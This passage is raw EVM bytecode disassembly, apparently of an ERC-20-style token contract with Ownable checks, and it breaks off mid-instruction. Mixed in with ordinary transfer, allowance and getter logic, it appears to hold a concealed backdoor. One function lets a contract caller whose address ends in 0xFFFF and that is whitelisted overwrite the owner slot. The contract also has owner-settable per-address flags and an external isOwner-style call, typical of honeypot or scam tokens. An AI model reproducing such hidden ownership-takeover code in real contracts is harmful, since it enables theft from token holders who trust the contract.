SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4FB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x53E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x512 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE91 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x54C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x555 PUSH2 0x1069 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x563 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5A6 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x11BC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5CC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5D5 PUSH2 0x11DC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x623 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x666 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x63A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1202 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x688 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x691 PUSH2 0x124B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x69F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6A8 PUSH2 0x13CC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6FF PUSH2 0x13F5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x73F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x724 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x76C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x786 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7C9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x79D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1497 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x83C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x806 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x14ED JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x85E PUSH2 0x1592 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x868 PUSH2 0x16A8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x88E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x8DB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x8A5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1886 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x901 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x90A PUSH2 0x189D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x958 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x99B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x96F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x18C2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9CA PUSH2 0x19E7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA53 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xA07 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1BC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA75 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xAA2 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA8C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1C4E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xAC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB0B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xADF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1DF5 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB19 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB22 PUSH2 0x1FFB JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x5 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0xBBC JUMPI DUP1 PUSH1 0x1F LT PUSH2 0xB91 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0xBBC JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0xB9F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBD3 CALLER DUP5 DUP5 PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x4 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x9 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC0C DUP5 DUP5 DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH2 0xCA5 DUP5 CALLER PUSH2 0xCA0 DUP6 PUSH1 0x3 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD62 CALLER DUP5 PUSH2 0xD5D DUP6 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x26B7 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xE30 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xA PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2F54BF6E DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF29 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF3F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1065 JUMPI DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2F54BF6E DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xFFD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMPDEST POP POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x10A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFFFF DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND AND EQ PUSH2 0x10C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 ISZERO ISZERO PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO EQ ISZERO PUSH2 0x11BA JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x130D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x148D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1462 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x148D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1470 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA PUSH1 0x0 DUP4 PUSH20 